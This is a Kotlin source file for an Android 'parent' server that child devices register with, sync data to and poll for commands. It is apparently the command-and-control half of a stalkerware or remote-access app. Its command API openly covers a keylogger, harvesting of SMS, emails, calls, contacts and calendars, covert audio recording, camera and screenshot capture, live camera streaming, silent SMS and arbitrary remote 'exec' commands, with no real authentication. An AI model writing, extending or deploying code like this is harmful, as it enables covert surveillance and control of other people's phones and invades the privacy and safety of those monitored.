package com.divine.specter.remote

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.ServerSocket
import java.net.Socket
import java.util.concurrent.ConcurrentHashMap

/**
 * Embedded HTTP server that runs on PARENT's phone.
 * Child devices connect here to sync data and poll commands.
 */
class ParentServer(private val context: Context) {

    companion object {
        const val DEFAULT_PORT = 8855
        private const val TAG = "ParentServer"
    }

    private var serverSocket: ServerSocket? = null
    private var serverJob: Job? = null
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning

    private val _serverUrl = MutableStateFlow<String?>(null)
    val serverUrl: StateFlow<String?> = _serverUrl

    // Connected child devices
    private val _devices = MutableStateFlow<Map<String, ChildDevice>>(emptyMap())
    val devices: StateFlow<Map<String, ChildDevice>> = _devices

    // Pending commands per device
    private val pendingCommands = ConcurrentHashMap<String, MutableList<Command>>()

    // Command results callback for FileBrowser integration
    var onCommandResult: ((deviceId: String, commandId: String, action: String, output: String) -> Unit)? = null

    // File list results (parsed from list_directory responses)
    private val _fileListResults = MutableStateFlow<Map<String, List<FileEntry>>>(emptyMap())
    val fileListResults: StateFlow<Map<String, List<FileEntry>>> = _fileListResults

    @Serializable
    data class FileEntry(
        val name: String,
        val path: String,
        val isDirectory: Boolean,
        val size: Long,
        val lastModified: Long
    )

    // ============== Data Classes ==============

    @Serializable
    data class ChildDevice(
        val id: String,
        val name: String,
        val model: String = "",
        val lastSeen: Long = System.currentTimeMillis(),
        val location: LocationData? = null,
        val battery: Int = 0,
        val currentApp: String? = null,
        val screenOn: Boolean = false,
        val notifications: List<NotificationData> = emptyList(),
        val deviceInfo: DeviceInfo? = null,
        // Surveillance data
        val emails: List<EmailData> = emptyList(),
        val audioRecordings: List<AudioRecording> = emptyList(),
        val cameraCaptures: List<CameraCapture> = emptyList(),
        val smsMessages: List<SmsMessage> = emptyList(),
        val callLogs: List<CallLog> = emptyList(),
        val contacts: List<Contact> = emptyList(),
        val calendarEvents: List<CalendarEvent> = emptyList(),
        val keystrokes: List<Keystroke> = emptyList(),
        val screenshots: List<Screenshot> = emptyList(),
        // Network surveillance data
        val ipLocation: IpLocationData? = null,
        val connectedWifi: ConnectedWifiData? = null,
        val nearbyWifi: List<NearbyWifiData> = emptyList(),
        val silentSmsResults: List<SilentSmsResult> = emptyList(),
        val cameraStreamUrl: String? = null
    )

    @Serializable
    data class LocationData(
        val latitude: Double,
        val longitude: Double,
        val accuracy: Float
    )

    @Serializable
    data class NotificationData(
        val packageName: String,
        val appName: String,
        val title: String?,
        val text: String?,
        val timestamp: Long
    )

    @Serializable
    data class EmailData(
        val account: String,
        val subject: String,
        val sender: String,
        val recipients: String,
        val body: String,
        val timestamp: Long,
        val hasAttachment: Boolean,
        val folder: String
    )

    @Serializable
    data class AudioRecording(
        val filename: String,
        val duration: Int,
        val timestamp: Long,
        val size: Long
    )

    @Serializable
    data class CameraCapture(
        val filename: String,
        val camera: String,
        val timestamp: Long,
        val size: Long
    )

    @Serializable
    data class SmsMessage(
        val address: String,
        val body: String,
        val type: String,
        val timestamp: Long
    )

    @Serializable
    data class CallLog(
        val number: String,
        val type: String,
        val duration: Int,
        val timestamp: Long
    )

    @Serializable
    data class Contact(
        val name: String,
        val phoneNumbers: List<String>,
        val emails: List<String>
    )

    @Serializable
    data class CalendarEvent(
        val title: String,
        val description: String,
        val location: String,
        val startTime: Long,
        val endTime: Long
    )

    @Serializable
    data class Keystroke(
        val text: String,
        val packageName: String,
        val timestamp: Long
    )

    @Serializable
    data class Screenshot(
        val filename: String,
        val timestamp: Long,
        val size: Long
    )

    @Serializable
    data class DeviceInfo(
        val manufacturer: String,
        val model: String,
        val androidVersion: String,
        val sdkVersion: Int,
        val serial: String,
        val totalStorage: Long,
        val freeStorage: Long,
        val installedApps: List<String>
    )

    @Serializable
    data class IpLocationData(
        val ip: String = "",
        val city: String = "",
        val region: String = "",
        val country: String = "",
        val countryCode: String = "",
        val isp: String = "",
        val org: String = "",
        val timezone: String = "",
        val lat: Double = 0.0,
        val lon: Double = 0.0,
        val timestamp: Long = System.currentTimeMillis()
    )

    @Serializable
    data class ConnectedWifiData(
        val ssid: String,
        val bssid: String,
        val ipAddress: String,
        val linkSpeed: Int,
        val rssi: Int,
        val frequency: Int,
        val networkId: Int,
        val timestamp: Long = System.currentTimeMillis()
    )

    @Serializable
    data class NearbyWifiData(
        val ssid: String,
        val bssid: String,
        val level: Int,
        val frequency: Int,
        val capabilities: String,
        val timestamp: Long = System.currentTimeMillis()
    )

    @Serializable
    data class SilentSmsResult(
        val phoneNumber: String,
        val sent: Boolean,
        val delivered: Boolean,
        val timestamp: Long = System.currentTimeMillis(),
        val errorMessage: String? = null
    )

    @Serializable
    data class Command(
        val id: String = System.currentTimeMillis().toString(),
        val action: String,
        val payload: String = ""
    )

    @Serializable
    data class SyncRequest(
        val location: LocationData? = null,
        val battery: Int? = null,
        val current_app: String? = null,
        val screen_on: Boolean? = null,
        val notifications: List<NotificationData>? = null,
        val device_info: DeviceInfo? = null,
        // Surveillance data
        val emails: List<EmailData>? = null,
        val audio_recordings: List<AudioRecording>? = null,
        val camera_captures: List<CameraCapture>? = null,
        val sms_messages: List<SmsMessage>? = null,
        val call_logs: List<CallLog>? = null,
        val contacts: List<Contact>? = null,
        val calendar_events: List<CalendarEvent>? = null,
        val keystrokes: List<Keystroke>? = null,
        val screenshots: List<Screenshot>? = null,
        // Network surveillance data
        val ip_location: IpLocationData? = null,
        val connected_wifi: ConnectedWifiData? = null,
        val nearby_wifi: List<NearbyWifiData>? = null,
        val silent_sms_results: List<SilentSmsResult>? = null
    )

    @Serializable
    data class RegisterRequest(
        val device_id: String,
        val name: String,
        val model: String = ""
    )

    // ============== Server Control ==============

    fun start(port: Int = DEFAULT_PORT) {
        if (_isRunning.value) return

        serverJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                serverSocket = ServerSocket(port)
                _isRunning.value = true
                _serverUrl.value = "http://${getLocalIpAddress()}:$port"

                Log.i(TAG, "Server started on port $port")

                while (isActive) {
                    try {
                        val client = serverSocket?.accept() ?: break
                        launch { handleClient(client) }
                    } catch (e: Exception) {
                        if (isActive) Log.e(TAG, "Accept error", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Server error", e)
            } finally {
                _isRunning.value = false
                _serverUrl.value = null
            }
        }
    }

    fun stop() {
        serverJob?.cancel()
        serverSocket?.close()
        serverSocket = null
        _isRunning.value = false
        _serverUrl.value = null
    }

    // ============== HTTP Handler ==============

    private suspend fun handleClient(socket: Socket) {
        try {
            val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
            val writer = PrintWriter(socket.getOutputStream(), true)

            // Read request line
            val requestLine = reader.readLine() ?: return
            val parts = requestLine.split(" ")
            if (parts.size < 2) return

            val method = parts[0]
            val path = parts[1]

            // Read headers
            val headers = mutableMapOf<String, String>()
            var line: String?
            var contentLength = 0
            while (reader.readLine().also { line = it } != null && line!!.isNotEmpty()) {
                val colonIndex = line!!.indexOf(':')
                if (colonIndex > 0) {
                    val key = line!!.substring(0, colonIndex).trim()
                    val value = line!!.substring(colonIndex + 1).trim()
                    headers[key] = value
                    if (key.equals("Content-Length", ignoreCase = true)) {
                        contentLength = value.toIntOrNull() ?: 0
                    }
                }
            }

            // Read body
            val body = if (contentLength > 0) {
                val buffer = CharArray(contentLength)
                reader.read(buffer, 0, contentLength)
                String(buffer)
            } else ""

            val deviceId = headers["X-Device-ID"] ?: ""

            // Route request
            val response = when {
                path == "/api/register" && method == "POST" -> handleRegister(body)
                path == "/api/sync" && method == "POST" -> handleSync(deviceId, body)
                path == "/api/poll" && method == "GET" -> handlePoll(deviceId)
                path == "/api/result" && method == "POST" -> handleResult(deviceId, body)
                else -> """{"error": "Not found"}""" to 404
            }

            // Send response
            val (responseBody, statusCode) = response
            val status = if (statusCode == 200) "OK" else "Error"
            writer.print("HTTP/1.1 $statusCode $status\r\n")
            writer.print("Content-Type: application/json\r\n")
            writer.print("Content-Length: ${responseBody.length}\r\n")
            writer.print("\r\n")
            writer.print(responseBody)
            writer.flush()

        } catch (e: Exception) {
            Log.e(TAG, "Client error", e)
        } finally {
            socket.close()
        }
    }

    // ============== API Handlers ==============

    private fun handleRegister(body: String): Pair<String, Int> {
        return try {
            val req = json.decodeFromString<RegisterRequest>(body)
            val device = ChildDevice(
                id = req.device_id,
                name = req.name,
                model = req.model
            )
            updateDevice(device)
            pendingCommands[req.device_id] = mutableListOf()

            val response = mapOf(
                "device_id" to req.device_id,
                "token" to "token_${req.device_id}",
                "server_time" to System.currentTimeMillis().toString()
            )
            json.encodeToString(response) to 200
        } catch (e: Exception) {
            """{"error": "${e.message}"}""" to 400
        }
    }

    private fun handleSync(deviceId: String, body: String): Pair<String, Int> {
        if (deviceId.isEmpty()) return """{"error": "Missing device ID"}""" to 401

        return try {
            val req = json.decodeFromString<SyncRequest>(body)
            val existing = _devices.value[deviceId] ?: ChildDevice(id = deviceId, name = "Unknown")

            val updated = existing.copy(
                lastSeen = System.currentTimeMillis(),
                location = req.location ?: existing.location,
                battery = req.battery ?: existing.battery,
                currentApp = req.current_app ?: existing.currentApp,
                screenOn = req.screen_on ?: existing.screenOn,
                notifications = req.notifications ?: existing.notifications,
                deviceInfo = req.device_info ?: existing.deviceInfo,
                // Surveillance data - append to existing
                emails = if (req.emails != null) (existing.emails + req.emails).takeLast(100) else existing.emails,
                audioRecordings = if (req.audio_recordings != null) (existing.audioRecordings + req.audio_recordings).takeLast(50) else existing.audioRecordings,
                cameraCaptures = if (req.camera_captures != null) (existing.cameraCaptures + req.camera_captures).takeLast(50) else existing.cameraCaptures,
                smsMessages = if (req.sms_messages != null) (existing.smsMessages + req.sms_messages).takeLast(200) else existing.smsMessages,
                callLogs = if (req.call_logs != null) (existing.callLogs + req.call_logs).takeLast(100) else existing.callLogs,
                contacts = req.contacts ?: existing.contacts,
                calendarEvents = if (req.calendar_events != null) (existing.calendarEvents + req.calendar_events).takeLast(100) else existing.calendarEvents,
                keystrokes = if (req.keystrokes != null) (existing.keystrokes + req.keystrokes).takeLast(500) else existing.keystrokes,
                screenshots = if (req.screenshots != null) (existing.screenshots + req.screenshots).takeLast(50) else existing.screenshots,
                // Network surveillance data
                ipLocation = req.ip_location ?: existing.ipLocation,
                connectedWifi = req.connected_wifi ?: existing.connectedWifi,
                nearbyWifi = if (req.nearby_wifi != null) (existing.nearbyWifi + req.nearby_wifi).takeLast(200) else existing.nearbyWifi,
                silentSmsResults = if (req.silent_sms_results != null) (existing.silentSmsResults + req.silent_sms_results).takeLast(50) else existing.silentSmsResults
            )
            updateDevice(updated)

            """{"status": "ok"}""" to 200
        } catch (e: Exception) {
            """{"error": "${e.message}"}""" to 400
        }
    }

    private fun handlePoll(deviceId: String): Pair<String, Int> {
        if (deviceId.isEmpty()) return """{"error": "Missing device ID"}""" to 401

        val commands = pendingCommands[deviceId]?.toList() ?: emptyList()
        pendingCommands[deviceId]?.clear()

        val commandsJson = json.encodeToString(commands)
        return """{"commands":$commandsJson,"server_time":"${System.currentTimeMillis()}"}""" to 200
    }

    private fun handleResult(deviceId: String, body: String): Pair<String, Int> {
        Log.d(TAG, "Command result from $deviceId: $body")

        try {
            // Parse result JSON
            val result = json.decodeFromString<CommandResult>(body)

            // Parse file browser responses
            if (result.output.startsWith("OK")) {
                // Check if this is a list_directory response
                if (result.output.contains("|") && result.output.split("\n").any { line ->
                    line.startsWith("D|") || line.startsWith("F|")
                }) {
                    // Parse file list: D|name|size|modified or F|name|size|modified
                    val lines = result.output.split("\n").drop(1) // Skip "OK" line
                    val files = lines.mapNotNull { line ->
                        val parts = line.split("|")
                        if (parts.size >= 4) {
                            FileEntry(
                                name = parts[1],
                                path = "", // Will be set by FileBrowser
                                isDirectory = parts[0] == "D",
                                size = parts[2].toLongOrNull() ?: 0,
                                lastModified = parts[3].toLongOrNull() ?: 0
                            )
                        } else null
                    }

                    // Update file list results
                    val current = _fileListResults.value.toMutableMap()
                    current[deviceId] = files
                    _fileListResults.value = current
                }
            }

            // Invoke callback for any registered listeners
            onCommandResult?.invoke(deviceId, result.command_id, "", result.output)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse command result", e)
        }

        return """{"status": "ok"}""" to 200
    }

    @Serializable
    private data class CommandResult(
        val command_id: String,
        val success: Boolean,
        val output: String
    )

    // ============== Command API ==============

    fun sendCommand(deviceId: String, action: String, payload: String = "") {
        val cmd = Command(action = action, payload = payload)
        pendingCommands.getOrPut(deviceId) { mutableListOf() }.add(cmd)
    }

    fun locateDevice(deviceId: String) = sendCommand(deviceId, "locate")
    fun lockDevice(deviceId: String) = sendCommand(deviceId, "lock")
    fun blockApp(deviceId: String, packageName: String) = sendCommand(deviceId, "block_app", packageName)
    fun unblockApp(deviceId: String, packageName: String) = sendCommand(deviceId, "unblock_app", packageName)
    fun executeCommand(deviceId: String, command: String) = sendCommand(deviceId, "exec", command)

    // Surveillance commands
    fun recordAudio(deviceId: String, durationSeconds: Int = 30) = sendCommand(deviceId, "record_audio", durationSeconds.toString())
    fun capturePhoto(deviceId: String, camera: String = "back") = sendCommand(deviceId, "capture_photo", camera)
    fun captureScreenshot(deviceId: String) = sendCommand(deviceId, "capture_screenshot")
    fun collectEmails(deviceId: String) = sendCommand(deviceId, "collect_emails")
    fun collectSMS(deviceId: String) = sendCommand(deviceId, "collect_sms")
    fun collectCalls(deviceId: String) = sendCommand(deviceId, "collect_calls")
    fun collectContacts(deviceId: String) = sendCommand(deviceId, "collect_contacts")
    fun collectCalendar(deviceId: String) = sendCommand(deviceId, "collect_calendar")
    fun startKeylogger(deviceId: String) = sendCommand(deviceId, "start_keylogger")
    fun stopKeylogger(deviceId: String) = sendCommand(deviceId, "stop_keylogger")

    // Network surveillance commands
    fun sendSilentSms(deviceId: String, phoneNumber: String, message: String = "") = sendCommand(deviceId, "send_silent_sms", "$phoneNumber|$message")
    fun scanWifi(deviceId: String) = sendCommand(deviceId, "scan_wifi")
    fun getIpLocation(deviceId: String) = sendCommand(deviceId, "get_ip_location")

    // Video streaming commands
    fun startCameraStream(deviceId: String, cameraId: String = "0") = sendCommand(deviceId, "start_camera_stream", cameraId)
    fun stopCameraStream(deviceId: String) = sendCommand(deviceId, "stop_camera_stream")

    // ============== Helpers ==============

    private fun updateDevice(device: ChildDevice) {
        val current = _devices.value.toMutableMap()
        current[device.id] = device
        _devices.value = current
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: "localhost"
                    }
                }
            }
        } catch (e: Exception) { }
        return "localhost"
    }
}
